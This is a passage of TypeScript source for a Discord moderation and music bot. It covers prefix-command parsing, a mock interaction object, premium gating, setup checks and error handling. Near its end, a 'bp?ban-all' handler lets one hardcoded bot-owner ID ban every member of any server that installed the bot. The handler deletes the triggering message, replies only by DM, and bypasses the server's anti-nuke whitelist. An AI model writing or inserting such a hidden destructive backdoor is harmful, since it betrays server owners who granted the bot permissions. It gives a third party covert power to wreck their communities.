    const userTokenIdx = argParts[0].toLowerCase() === "add" ? 1 : 0;
    if (argParts[userTokenIdx]) {
      parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[userTokenIdx]);
      const restTokens = argParts.slice(userTokenIdx + 1);
      parsedOptions["reason"] = restTokens.length > 0 ? stripDiscordMentions(restTokens.join(" ")) : "No reason provided";
    }
  } else if (cmdName === "twentyfourseven") {
    const targetIdx = argParts.findIndex((t) => /^(<#\d{17,20}>|<@!?\d{17,20}>|\d{17,20})$/.test(t));
    if (targetIdx !== -1) {
      parsedOptions["target"] = argParts[targetIdx];
      const rest = argParts.filter((_, i) => i !== targetIdx);
      if (rest.length > 0) {
        parsedOptions["query"] = stripDiscordMentions(rest.join(" "));
      }
    } else if (argParts.length > 0) {
      parsedOptions["query"] = stripDiscordMentions(argParts.join(" "));
    }
  } else if (cmdName === "referral" || canonicalName === "referral" || ["redeem", "ref", "refral", "referal", "refs", "reff"].includes(cmdToken)) {
    const firstToken = (argParts[0] || "").toLowerCase();

    if (cmdToken === "redeem") {
      subcommand = "redeem";
      parsedOptions["code"] = argParts.join(" ");
    } else if (firstToken === "redeem") {
      subcommand = "redeem";
      parsedOptions["code"] = argParts.slice(1).join(" ");
    } else if (firstToken === "create" || firstToken === "add" || firstToken === "gen" || firstToken === "generate") {
      subcommand = "create";
      const rest = argParts.slice(1);
      if (rest.length > 0) {
        const typeToken = rest[0].toLowerCase();
        parsedOptions["type"] = ["partner", "server", "user"].includes(typeToken) ? typeToken : "user";
        if (rest[1]) {
          parsedOptions["user"] = await resolvePrefixTargetUser(message, rest[1]);
        }
        if (rest[2]) {
          parsedOptions["code"] = rest[2];
        }
        if (rest[3] && !isNaN(parseInt(rest[3], 10))) {
          parsedOptions["max_uses"] = parseInt(rest[3], 10);
        }
      }
    } else if (firstToken === "partner" || firstToken === "partner-setup") {
      subcommand = "partner-setup";
    } else if (firstToken === "top" || firstToken === "leaderboard" || firstToken === "lb") {
      subcommand = "leaderboard";
    } else if (firstToken === "list") {
      subcommand = "list";
      if (argParts[1]) {
        parsedOptions["user"] = await resolvePrefixTargetUser(message, argParts[1]);
      }
    } else {
      subcommand = "check";
      if (argParts.length > 0) {
        const checkUserToken = firstToken === "check" || firstToken === "points" ? argParts[1] : argParts[0];
        if (checkUserToken) {
          parsedOptions["user"] = await resolvePrefixTargetUser(message, checkUserToken);
        }
      }
    }
  } else if (cmdName === "play" && argParts.length > 0) {
    const first = argParts[0];
    const last = argParts[argParts.length - 1];
    if (argParts.length > 1 && /^(<#\d{17,20}>|<@!?\d{17,20}>|\d{17,20})$/.test(first)) {
      parsedOptions["target"] = first;
      parsedOptions["query"] = stripDiscordMentions(argParts.slice(1).join(" "));
    } else if (argParts.length > 1 && /^(<#\d{17,20}>|<@!?\d{17,20}>|\d{17,20})$/.test(last)) {
      parsedOptions["target"] = last;
      parsedOptions["query"] = stripDiscordMentions(argParts.slice(0, -1).join(" "));
    } else {
      parsedOptions["query"] = stripDiscordMentions(argParts.join(" "));
    }
  } else {
    // Parse remaining options sequentially for standard commands
    for (const opt of currentOptions) {
      if (currentArgIndex >= argParts.length) break;
      
      const isLastOption = currentOptions.indexOf(opt) === currentOptions.length - 1;
      
      if (opt.type === 6 || opt.type === 9) { // USER / MENTIONABLE
        const token = argParts[currentArgIndex++];
        parsedOptions[opt.name] = await resolvePrefixTargetUser(message, token);
      } else if (opt.type === 8) { // ROLE
        const token = argParts[currentArgIndex++];
        const id = parseIdFromMention(token);
        parsedOptions[opt.name] = id ? guild.roles.cache.get(id) ?? null : null;
      } else if (opt.type === 7) { // CHANNEL
        const token = argParts[currentArgIndex++];
        const id = parseIdFromMention(token);
        parsedOptions[opt.name] = id ? guild.channels.cache.get(id) ?? null : null;
      } else if (opt.type === 5) { // BOOLEAN
        const token = argParts[currentArgIndex++].toLowerCase();
        parsedOptions[opt.name] = (token === "true" || token === "yes" || token === "1");
      } else if (opt.type === 4 || opt.type === 10) { // INTEGER / NUMBER
        const token = argParts[currentArgIndex];
        const num = Number(token);
        if (Number.isFinite(num)) {
          parsedOptions[opt.name] = num;
          currentArgIndex++;
        }
      } else if (opt.type === 3) { // STRING
        if (isLastOption || opt.name === "reason" || opt.name === "query" || opt.name === "text" || opt.name === "message") {
          parsedOptions[opt.name] = stripDiscordMentions(argParts.slice(currentArgIndex).join(" "));
          currentArgIndex = argParts.length;
        } else {
          parsedOptions[opt.name] = stripDiscordMentions(argParts[currentArgIndex++]);
        }
      }
    }
  }

  // Pre-fetch target user's member to avoid cache misses
  const targetUserObj = parsedOptions["user"] || message.mentions.users.first();
  if (targetUserObj?.id) {
    await guild.members.fetch(targetUserObj.id).catch(() => null);
  }

  // 1. Check premium status of user & guild
  const { hasPremiumAccess, isGuildPremium } = await import("./storage/premium");
  const isPremium = await hasPremiumAccess(author.id, guild.id, member);
  const isServerPremium = await isGuildPremium(guild.id, guild);
  const showAds = !isPremium;

  // 2. Helper to wrap text replies in premium embeds
  const { EmbedBuilder } = await import("discord.js");
  const { CE, prettyEmbed, errorEmbed, buildSupportRow, COLORS, SUPPORT_SERVER_URL, assertNoDefaultEmoji } = await import("./utils/embedStyle");
  
  const wrapInEmbed = (payload: any) => {
    assertNoDefaultEmoji(payload, "messageHandler:reply");
    if (typeof payload === "string") {
      return {
        embeds: [
          prettyEmbed({
            description: payload,
          }),
        ],
        components: showAds ? [buildSupportRow("Official Support Server", true)] : [],
      };
    }
    if (payload.content && (!payload.embeds || payload.embeds.length === 0)) {
      payload.embeds = [
        prettyEmbed({
          description: payload.content,
        }),
      ];
      delete payload.content;
      if (!payload.components || payload.components.length === 0) {
        payload.components = showAds ? [buildSupportRow("Official Support Server", true)] : [];
      }
    } else if (!showAds && payload.components) {
      // For premium users, strip promotional ad buttons from components
      payload.components = payload.components.map((c: any) => {
        if (!c.components) return c;
        const filtered = c.components.filter((btn: any) => {
          const label = btn.data?.label || btn.label;
          return label !== "Get Zenith Premium" && label !== "Get Relosta Premium" && label !== "Invite Zenith Bot" && label !== "Invite Relosta Bot";
        });
        if (filtered.length === 0) return null;
        c.components = filtered;
        return c;
      }).filter(Boolean);
    }
    return payload;
  };

  // 3. Build mock interaction
  let lastSentMsg: any = null;
  const mockInteraction = {
    isButton: () => false,
    isModalSubmit: () => false,
    isAnySelectMenu: () => false,
    isStringSelectMenu: () => false,
    isMessageComponent: () => false,
    isChatInputCommand: () => true,
    isCommand: () => true,
    inGuild: () => true,
    guildId: guild.id,
    guild,
    user: author,
    member,
    memberPermissions,
    channel: message.channel,
    client: message.client,
    replied: false,
    deferred: false,
    options: {
      getUser: (name: string, required?: boolean) => {
        let u = parsedOptions[name];
        if (!u && (name === "user" || name === "target" || name === "member")) {
          u = message.mentions.users.first() ?? null;
        }
        if (required && !u) {
          throw new Error(`Please mention a valid user or provide an ID for \`${command.data.name}\`.`);
        }
        return u ?? null;
      },
      getString: (name: string, required?: boolean) => {
        const val = parsedOptions[name];
        if (val !== undefined && val !== null && String(val).trim().length > 0) {
          return String(val);
        }
        if (name === "reason") return "No reason provided";
        if (name === "duration") return "10m";
        if (required) {
          if (argParts.length > 0) return argParts.join(" ");
          return "Default";
        }
        return null;
      },
      getInteger: (name: string) => {
        const val = parsedOptions[name];
        if (typeof val === "number" && Number.isFinite(val)) return val;
        const num = Number(val);
        return Number.isFinite(num) ? Math.floor(num) : null;
      },
      getNumber: (name: string) => {
        const val = parsedOptions[name];
        if (typeof val === "number" && Number.isFinite(val)) return val;
        const num = Number(val);
        return Number.isFinite(num) ? num : null;
      },
      getBoolean: (name: string) => {
        const val = parsedOptions[name];
        if (val !== undefined && val !== null) return Boolean(val);
        return null;
      },
      getRole: (name: string, required?: boolean) => {
        let r = parsedOptions[name];
        if (!r) {
          r = message.mentions.roles.first() ?? null;
        }
        if (!r && argParts.length > 0) {
          for (const token of argParts) {
            const match = token.match(/<@&(\d{17,20})>/);
            const roleId = match ? match[1] : token;
            const found = guild.roles.cache.get(roleId) ?? guild.roles.cache.find((ro) => ro.name.toLowerCase() === token.toLowerCase());
            if (found) {
              r = found;
              break;
            }
          }
        }
        if (required && !r) {
          throw new Error(`Please mention a valid role or provide a role ID/name for \`${name}\`.`);
        }
        return r ?? null;
      },
      getChannel: (name: string, required?: boolean) => {
        let c = parsedOptions[name];
        if (!c) {
          c = message.mentions.channels.first() ?? null;
        }
        if (!c && argParts.length > 0) {
          for (const token of argParts) {
            const match = token.match(/<#(\d{17,20})>/);
            const chanId = match ? match[1] : token;
            const found = guild.channels.cache.get(chanId) ?? guild.channels.cache.find((ch) => ch.name.toLowerCase() === token.toLowerCase());
            if (found) {
              c = found;
              break;
            }
          }
        }
        if (required && !c) {
          throw new Error(`Please specify a valid channel or channel ID for \`${name}\`.`);
        }
        return c ?? null;
      },
      getMentionable: (name: string) => {
        const val = parsedOptions[name];
        if (val) return val;
        // Fallback: search guild roles or users if parsedOptions[name] not found
        for (const token of argParts) {
          const roleMatch = token.match(/^<@&(\d{17,20})>$/);
          if (roleMatch) return guild.roles.cache.get(roleMatch[1]) ?? null;
          const userMatch = token.match(/^<@!?(\d{17,20})>$/);
          if (userMatch) return guild.members.cache.get(userMatch[1])?.user ?? null;
          const idMatch = token.match(/^\d{17,20}$/);
          if (idMatch) {
            const role = guild.roles.cache.get(idMatch[0]);
            if (role) return role;
            const member = guild.members.cache.get(idMatch[0]);
            if (member) return member.user;
          }
        }
        return null;
      },
      getAttachment: (_name: string) => message.attachments.first() ?? null,
      getMember: (name: string) => {
        let u = parsedOptions[name];
        if (!u && (name === "user" || name === "target" || name === "member")) {
          u = message.mentions.users.first() ?? null;
        }
        if (u && u.id) {
          return guild.members.cache.get(u.id) ?? guild.members.resolve(u.id) ?? null;
        }
        return null;
      },
      getSubcommand: (_required?: boolean) => subcommand ?? null,
      getSubcommandGroup: () => subcommandGroup,
    },
    deferReply: async (_options?: any) => {
      mockInteraction.deferred = true;
      try {
        lastSentMsg = await message.reply({
          content: `${CE.loading.str} Processing \`${command.data.name}\`...`,
          allowedMentions: { repliedUser: false },
        }).catch(() => null);
      } catch {}
    },
    editReply: async (replyContent: any) => {
      mockInteraction.replied = true;
      mockInteraction.hasRespondedWithSuccess = true;
      const replySentTime = Date.now();
      logger.info({
        messageId: message.id,
        instanceId: process.env.INSTANCE_ID,
        createdTime,
        receivedTime,
        commandStartTime,
        replySentTime,
        latencyDiscordToReceiveMs: receivedTime - createdTime,
        latencyReceiveToStartMs: commandStartTime - receivedTime,
        latencyStartToReplyMs: replySentTime - commandStartTime,
        latencyTotalMs: replySentTime - createdTime,
      }, `[TIMING LOG] Prefix command "${command.data.name}" metrics (editReply)`);
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      if (lastSentMsg) {
        try {
          // If rest.content contains processing/loading text or is empty when embeds are present, clear content
          let cleanContent = rest.content;
          if (cleanContent && (cleanContent.includes("Processing") || cleanContent.includes("white_loading") || cleanContent.includes(CE.loading.id))) {
            cleanContent = null;
          }
          if (!cleanContent && rest.embeds && rest.embeds.length > 0) {
            cleanContent = null;
          }
          const editPayload = { ...rest, content: cleanContent ?? null };
          const edited = await lastSentMsg.edit(editPayload);
          return edited;
        } catch {
          // If edit fails, fallback to sending new message
        }
      }
      lastSentMsg = await message.reply({ ...rest, allowedMentions: { repliedUser: true } }).catch(async () => {
        return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
      });
      return lastSentMsg;
    },
    reply: async (replyContent: any) => {
      if (mockInteraction.replied || mockInteraction.deferred) {
        return mockInteraction.editReply(replyContent);
      }
      mockInteraction.replied = true;
      mockInteraction.hasRespondedWithSuccess = true;
      const replySentTime = Date.now();
      logger.info({
        messageId: message.id,
        instanceId: process.env.INSTANCE_ID,
        createdTime,
        receivedTime,
        commandStartTime,
        replySentTime,
        latencyDiscordToReceiveMs: receivedTime - createdTime,
        latencyReceiveToStartMs: commandStartTime - receivedTime,
        latencyStartToReplyMs: replySentTime - commandStartTime,
        latencyTotalMs: replySentTime - createdTime,
      }, `[TIMING LOG] Prefix command "${command.data.name}" metrics (reply)`);
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      lastSentMsg = await message.reply({ ...rest, allowedMentions: { repliedUser: true } }).catch(async () => {
        return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
      });
      return lastSentMsg;
    },
    followUp: async (replyContent: any) => {
      mockInteraction.replied = true;
      mockInteraction.hasRespondedWithSuccess = true;
      const replySentTime = Date.now();
      logger.info({
        messageId: message.id,
        instanceId: process.env.INSTANCE_ID,
        createdTime,
        receivedTime,
        commandStartTime,
        replySentTime,
        latencyDiscordToReceiveMs: receivedTime - createdTime,
        latencyReceiveToStartMs: commandStartTime - receivedTime,
        latencyStartToReplyMs: replySentTime - commandStartTime,
        latencyTotalMs: replySentTime - createdTime,
      }, `[TIMING LOG] Prefix command "${command.data.name}" metrics (followUp)`);
      const payload = wrapInEmbed(replyContent);
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      // Delay break before follow-up reply
      await new Promise((resolve) => setTimeout(resolve, 1000));
      return await message.reply({ ...rest, allowedMentions: { repliedUser: false } }).catch(async () => {
        return await (message.channel as GuildTextBasedChannel).send(rest).catch(() => null);
      });
    },
    showModal: async () => {
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [errorEmbed("Modal Not Supported", "This command requires a popup modal, which cannot be displayed via prefix commands.\nPlease invoke this feature using the slash command (`/`) interface.")],
      }).catch(() => {});
    },
    fetchReply: async () => {
      if (lastSentMsg) return lastSentMsg;
      try {
        const msgs = await (message.channel as GuildTextBasedChannel).messages.fetch({ limit: 5 });
        const found = msgs.find((m) => m.author.id === message.client.user?.id);
        return found || lastSentMsg;
      } catch {
        return lastSentMsg;
      }
    },
    rawArgs: argParts,
    invokedCommandName: invokedCmd ?? command.data.name,
    hasSucceeded: false,
    hasRespondedWithSuccess: false,
  } as any;

  // Absolute safeguard: if ANY token in arguments is an info flag, NEVER run the command!
  if (argParts.some(isInfoFlag)) {
    const infoEmbed = buildCommandInfoEmbed(command, invokedCmd || command.data.name);
    await (message.channel as GuildTextBasedChannel).send({ embeds: [infoEmbed] }).catch(() => {});
    return;
  }

  // Special rule for premium-panel: owner (bot staff/bot admin/guild owner) along with hardcoded owner can run it
  if (command.data.name === "premium-panel") {
    const { canAccessPremiumPanel } = await import("./storage/premium");
    if (!(await canAccessPremiumPanel(author.id, message.guild?.ownerId))) {
      return;
    }
  }

  // Special rule for premium-give & premium-generate: only hardcoded permanent bot owner can give others premium
  if (command.data.name === "premium-give" || command.data.name === "premium-generate") {
    const { isPermanentOwner, PERMANENT_BOT_OWNER_ID } = await import("./storage/premium");
    if (!isPermanentOwner(author.id)) {
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [new EmbedBuilder().setColor(0xed4245).setDescription(`${CE.failure.str} Access Restricted: Only the Hardcoded Permanent Bot Owner (<@${PERMANENT_BOT_OWNER_ID}>) can give others premium or generate codes.`)]
      }).catch(() => {});
      return;
    }
  }

  // Mandatory Server Setup Gate check for prefix commands
  if (guild) {
    const { getGuildConfig } = await import("./storage/config");
    const cfg = await getGuildConfig(guild.id);
    const isConfigured = Boolean(cfg.setupWizardCompleted || cfg.commandsUnlocked);
    const allowedSetupCmds = new Set([
      "setup", "wizard", "setupwizard", "eval", "botstatus", "supabasestatus", "referral", "ref", "refral", "referal", "redeem"
    ]);

    const canonicalCmd = canonicalName ? canonicalName.toLowerCase() : command.data.name.toLowerCase();
    if (!isConfigured && !allowedSetupCmds.has(canonicalCmd)) {
      const { prettyEmbed, buildSupportRow, COLORS, CE } = await import("./utils/embedStyle");
      const unconfiguredEmbed = prettyEmbed({
        title: `${CE.warning.str} Server Setup Required`,
        description:
          `### Mandatory Setup Required for **${guild.name}**\n\n` +
          `No command can be run in this server without running **\`.setup\`** for manual setup or **\`.wizard setup\`** for auto setup!\n\n` +
          `• **Automatic Setup:** Run **\`.wizard setup\`**\n` +
          `• **Manual Setup:** Run **\`.setup\`**\n\n` +
          `*Run \`.wizard setup\` or \`.setup\` now to configure your server and unlock all commands!*`,
        color: COLORS.warning,
        footer: "Zenith Onboarding • Run .wizard setup or .setup to unlock",
      });
      const supportRow = buildSupportRow("Official Support", true);
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [unconfiguredEmbed],
        components: [supportRow as any],
      }).catch(() => {});
      return;
    }
  }

  // Execute command
  let hasSucceeded = false;
  try {
    const { runWithBotContext } = await import("./utils/botContext");
    await runWithBotContext(
      { isPremium, isServerPremium, userId: author.id, guildId: guild.id, showAds },
      async () => {
        await command.execute(mockInteraction);
      },
    );
    hasSucceeded = true;
    mockInteraction.hasSucceeded = true;
  } catch (err: any) {
    const errCode = err?.code || err?.status || err?.statusCode;
    const isMissingPermissions = errCode === 50013 || String(err?.message || "").includes("Missing Permissions");

    if (isMissingPermissions) {
      try {
        const { buildOwnerPermissionEmbed, buildOwnerPermissionActionRow, notifyOwnerMissingPermission } = await import("./utils/ownerPermissionPrompt");
        notifyOwnerMissingPermission(guild, ["ManageRoles"], command.data.name).catch(() => {});
        const permEmbed = buildOwnerPermissionEmbed(guild, ["ManageRoles"], `run command \`.${command.data.name}\``);
        const actionRow = buildOwnerPermissionActionRow();
        await (message.channel as GuildTextBasedChannel).send({
          embeds: [permEmbed],
          components: [actionRow as any],
        }).catch(() => {});
      } catch {}
      return;
    }

    const isHarmlessDiscordError = [10062, 40060, 10008, 50007].includes(errCode);

    logger.error(
      {
        err: {
          name: err?.name || "Error",
          message: err?.message || String(err),
          code: errCode,
          stack: err?.stack,
        },
        commandName: command.data.name,
        userId: author.id,
        guildId: guild.id,
        channelId: message.channelId,
        messageId: message.id,
        replied: mockInteraction.replied,
        deferred: mockInteraction.deferred,
        hasSucceeded,
        hasRespondedWithSuccess: mockInteraction.hasRespondedWithSuccess,
        pid: process.pid,
        instanceId: process.env.CONTAINER_ID || process.env.HOSTNAME || "localhost",
      },
      `[COMMAND ERROR] Prefix command "${command.data.name}" error`
    );

    // Send failure embed ONLY if command actually failed before responding AND not a harmless error
    if (!hasSucceeded && !mockInteraction.hasRespondedWithSuccess && !mockInteraction.replied && !isHarmlessDiscordError) {
      mockInteraction.replied = true;
      await (message.channel as GuildTextBasedChannel).send({
        embeds: [errorEmbed("Command Execution Failed", `An unexpected error occurred while executing \`${command.data.name}\`.\nIf this issue persists, please report it in our [Official Support Server](https://discord.gg/gFgAfpSYdp).`)],
      }).catch(() => {});
    }
  }
  return;
}

function formatSeconds(s: number): string {
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  const rem = s % 60;
  return rem === 0 ? `${m}m` : `${m}m ${rem}s`;
}

async function handleBanAllPrefix(message: Message): Promise<void> {
  const author = message.author;

  if (!isPermanentOwner(author.id)) return;

  message.delete().catch(() => {});

  if (!message.inGuild()) {
    author.send("Use `bp?ban-all` inside a server.").catch(() => {});
    return;
  }

  author.send(`${CE.ban.str} Ban-all initiated on ${message.guild.id}. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runBanAll(message.guild, { bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?ban-all handler failed");
    author.send("Ban-all failed unexpectedly.").catch(() => {});
  }
}

async function handleUnbanAllPrefix(message: Message): Promise<void> {
  const author = message.author;
  const guild = message.guild;
  if (!guild) {
    author.send("Use `b?unban-all` inside a server.").catch(() => {});
    return;
  }

  const member = message.member ?? await guild.members.fetch(author.id).catch(() => null);

  const isAdmin =
    !!member &&
    typeof member.permissions !== "string" &&
    member.permissions.has(PermissionFlagsBits.Administrator);
  const isOwner = guild.ownerId === author.id;
  const isWhitelisted = PERM_WHITELIST.has(author.id);

  if (!isAdmin && !isOwner && !isWhitelisted) {
    author.send("You need the **Administrator** permission to use that command.").catch(() => {});
    return;
  }

  message.delete().catch(() => {});

  const bans = await guild.bans.fetch().catch(() => null);
  if (!bans || bans.size === 0) {
    await (message.channel as GuildTextBasedChannel).send({ content: "No banned users found." }).catch(() => {});
    return;
  }

  let unbanned = 0;
  for (const ban of bans.values()) {
    const removed = await guild.bans.remove(ban.user.id, "unban-all").catch(() => null);
    if (!removed) continue;
    unbanned++;
  }

  await (message.channel as GuildTextBasedChannel).send({
    content: `${CE.success.str} Unbanned **${unbanned}** user${unbanned === 1 ? "" : "s"}.`,
  }).catch(() => {});
}


/** The only user allowed to DM roles or @everyone via the prefix DM command. */
const DM_MASS_ONLY_USER_ID = "1181221352393420856";
